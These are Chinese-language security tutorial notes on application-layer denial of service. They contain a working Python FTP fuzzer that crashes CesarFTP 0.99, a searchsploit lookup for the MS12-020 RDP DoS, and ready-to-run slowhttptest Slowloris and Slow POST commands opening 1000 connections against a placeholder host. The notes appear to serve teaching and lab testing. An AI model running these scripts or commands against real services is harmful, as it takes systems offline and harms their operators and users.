
# 应用层DoS

> * 应用服务漏洞
>   - 服务代码存在漏洞，遇异常提交数据时程序崩溃
>   - 应用处理大量并发请求能力有限，被拒绝的是应用或OS
> * 缓冲区溢出漏洞
>   - 向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存
>   - 影响：远程代码执行、DoS
>   - 利用模糊测试方法发现缓冲区溢出漏洞


* 实例1 - CesarFTP 0.99    服务漏洞 
```python
#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket
import sys
if len(sys.argv) != 5:
    print("用法：./ftp_fuzz.py [目标IP] [目标端口] [步长] [最大长度]")
    print("举例：./ftp_fuzz.py  1.1.1.1  21   100  1000")
    sys.exit()
    
ip = str(sys.argv[1])
port = int(sys.argv[2])
i = int(sys.argv[3])
step = int(sys.argv[3])
max = int(sys.argv[4])
user = raw_input(str("FTP账号："))
passwd = raw_input(str("FTP密码："))
command = raw_input(str("FTP命令："))
 
while i <= max:
    try:
        payload = command + " " + ('\n' * i)
        print("已发送" + str(i) + "个换行符")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect=s.connect((ip,port))
        s.recv(1024)
        s.send('USER' + user + '\r\n')
        s.recv(1024)
        s.send('PASS' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT\r\r')
        s.recv(1024)
        s.close()
        i = i + step
    except:
        print("\n服务已奔溃")
        sys.exit()
 
print("\n未发现缓冲区溢出漏洞")
```


* 实例2 - Ms12-020 远程桌面协议DoS漏洞
``` 
searchsploit ms12-020
　/usr/share/exploitdb/exploits/windows/dos/18606.txt　　// 找到其利用方法
```



## Slowhttptest
* 特点
1. 低带宽应用层慢写DoS攻击（相对于CC等快速攻击而言的慢速）　　　　客户端只有1M的带宽，服务器有1G的带宽，仍然可以用仅有的1M的带宽将服务器拥有1G的带宽打死  
2. 最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）  
3. 尤其擅长攻击apache、tomcat（几乎百发百中）  

* 攻击方法
> 1. Slowloris、Slow HTTP POST 攻击
>   - 耗尽应用的并发连接池，类似于Http层的Syn flood
>   - HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS
>   - Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n……
>   - Slow POST：HTTP头content-length声明长度，但body部分缓慢发送
> 2. Slow Read attack攻击
>   - 与 slowloris and slow POST目的相同，都是耗尽应用的并发连接池
>   - 不同之处在于请求正常发送，但慢速读取响应数据
>   - 攻击者调整TCP window窗口大小，是服务器慢速返回数据
> 3. Apache Range Header attack （对DVWA测试无效）
>   - 客户端传输大文件时，体积查过HTTP Body大小限制时进行分段
>   - x2耗尽服务器CPU、内存资源

* 攻击1 - HTTP Post 攻击模式
``` 
// -c 建立1000个连接  
// -B Slow HTTP POST模式攻击 
// -g  -o 输出到body_stats文件,-i  间隔110秒，
// -r  请求的速率  
// -s  指定Content-Length header的长度（只适用于Slow HTTP POST攻击模式） 
// -t  采用的是FAKEVERB请求方式   
// -u  指定URL  
// -x  指定每次传输数据最大的长度   
// -p  指定在多长时间内服务端没有响应我我就判定其被dos了
slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB   -u http://1.1.1.1 -x 10 -p 3　　
```

* 攻击2 - slowloris 攻击模式
```go 
// -H 采用SlowLoris攻击模式
slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://1.1.1.1 -x 24 -p 3　　
```
**配置: ulimite -n 70000　　　　　　// 设置最大文件打开数**


* 攻击3 - 其他攻击
``` 
▪ 炸邮箱
　　– 使用垃圾邮件塞满邮箱
▪ 无意识的/非故意的拒绝服务攻击
　　– 数据库服务器宕机恢复后，引用队列大量请求洪水涌来
　　– 告警邮件在邮件服务器修改地址后洪水攻击防火墙
```

